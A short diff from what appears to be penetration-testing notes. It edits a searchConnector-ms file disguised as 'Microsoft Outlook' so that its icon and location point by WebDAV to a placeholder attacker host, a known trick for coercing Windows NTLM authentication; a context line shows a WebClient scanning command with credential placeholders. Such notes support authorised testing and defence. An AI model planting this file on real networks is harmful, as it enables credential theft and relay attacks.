@@ -159,12 +159,12 @@ webclientservicescanner <DOMAIN>/<USER>:<PASSWORD>@<IP RANGE> -dc-ip <DC IP>
     <description>Microsoft Outlook</description>
     <isSearchOnlyItem>false</isSearchOnlyItem>
     <includeInStartMenuScope>true</includeInStartMenuScope>
-    <iconReference>https://<ATTACKER IP>/0001.ico</iconReference>
+    <iconReference>//<ATTACKER IP>@80/test.ico</iconReference>
     <templateInfo>
         <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
     </templateInfo>
     <simpleLocation>
-        <url>https://www.bussink.net/</url>
+        <url>//<ATTACKER IP>@80/test</url>
     </simpleLocation>
 </searchConnectorDescription>
 ```
